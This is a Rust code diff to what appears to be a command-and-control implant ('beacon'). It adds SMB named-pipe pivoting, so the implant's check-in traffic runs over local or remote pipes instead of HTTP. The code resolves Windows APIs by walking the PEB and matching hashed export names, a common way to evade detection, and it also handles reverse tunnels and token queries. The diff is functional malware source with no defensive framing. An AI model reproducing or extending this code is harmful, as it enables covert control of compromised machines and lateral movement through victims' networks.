@@ -49,6 +49,7 @@ const H_OPEN_PROCESS_TOKEN: u64 = fnv1a64(b"OpenProcessToken");
 const H_GET_TOKEN_INFORMATION: u64 = fnv1a64(b"GetTokenInformation");
 const H_ADVAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("advapi32.dll");
 const H_WRITE_FILE: u64 = fnv1a64(b"WriteFile");
+const H_WAIT_NAMED_PIPE_A: u64 = fnv1a64(b"WaitNamedPipeA");
 
 /// WIN32_FIND_DATAA tail: attributes at +0, ftLastWriteTime at +0x14,
 /// size (high:low) at +0x1C/+0x20, cFileName at +0x2C.
@@ -60,6 +61,8 @@ const FIND_OFF_SIZE_LOW: usize = 0x20;
 const FIND_OFF_NAME: usize = 0x2C;
 
 const GENERIC_READ: u32 = 0x8000_0000;
+const GENERIC_WRITE: u32 = 0x4000_0000;
+const INVALID_HANDLE_VALUE: isize = -1;
 const FILE_SHARE_READ: u32 = 0x0000_0001;
 const OPEN_EXISTING: u32 = 3;
 const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x0000_0010;
@@ -123,6 +126,8 @@ pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut
             tunnel_pause_resume(instance, channel_id, false, results)
         }
         Task::TunnelReverse { .. } => tunnel_reverse(instance, &task, id, results),
+        Task::Link { .. } => link(instance, &task, id, results),
+        Task::Unlink => unlink(instance, id, results),
         Task::Sleep { .. } | Task::Terminate => {}
     }
 }
@@ -3636,4 +3641,93 @@ pub unsafe fn tunnel_tick(instance: &mut Instance, w: &mut Writer) {
         }
         i += 1;
     }
+}
+
+// --- SMB named-pipe pivot: link / unlink (docs/WIRE.md, pivot section) ----
+
+/// `link`: connect the check-in transport to a named pipe (local
+/// `\\.\pipe\...` or remote `\\host\pipe\...` over SMB). While a
+/// pivot is active, every check-in exchange runs over the pipe
+/// (`net::pipe_exchange`) instead of WinHTTP.
+///
+/// # Safety
+///
+/// Beacon thread; kernel32 resolved on the instance.
+pub unsafe fn link(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    let Task::Link { .. } = task else {
+        return;
+    };
+    if instance.pivot.is_some() {
+        unlink(instance, id, results);
+    }
+    let mut buf = [0u8; transport::PATH_CAP + 1];
+    let Some(_n) = c_path(task, &mut buf) else {
+        error(kernel32, id, results);
+        return;
+    };
+    let create = peb::find_export(kernel32, H_CREATE_FILE_A);
+    let wait_pipe = peb::find_export(kernel32, H_WAIT_NAMED_PIPE_A);
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if create.is_null() || close.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let create = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8, u32, u32, *mut c_void, u32, u32, isize) -> isize,
+    >(create as *const core::ffi::c_void);
+    let mut h = create(
+        buf.as_ptr(),
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        core::ptr::null_mut(),
+        OPEN_EXISTING,
+        0,
+        0,
+    );
+    if h == INVALID_HANDLE_VALUE && !wait_pipe.is_null() {
+        // Pipe busy: wait for an instance, then retry once (native pattern).
+        let wait_pipe = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*const u8, u32) -> i32,
+        >(wait_pipe as *const core::ffi::c_void);
+        if wait_pipe(buf.as_ptr(), 20_000) != 0 {
+            h = create(
+                buf.as_ptr(),
+                GENERIC_READ | GENERIC_WRITE,
+                0,
+                core::ptr::null_mut(),
+                OPEN_EXISTING,
+                0,
+                0,
+            );
+        }
+    }
+    if h == INVALID_HANDLE_VALUE || h == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    instance.pivot = Some(crate::net::PivotState { handle: h });
+    let _ = transport::push_plain_result(results, id, transport::COMMAND_LINK);
+}
+
+/// `unlink`: close the pivot pipe, back to the direct HTTP transport.
+///
+/// # Safety
+///
+/// Beacon thread.
+pub unsafe fn unlink(instance: &mut Instance, id: u32, results: &mut Writer) {
+    let kernel32 = instance.kernel32;
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    if let Some(p) = instance.pivot.take() {
+        if !close.is_null() {
+            let close = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(isize) -> i32,
+            >(close as *const core::ffi::c_void);
+            close(p.handle);
+        }
+    }
+    let _ = transport::push_plain_result(results, id, transport::COMMAND_UNLINK);
 }
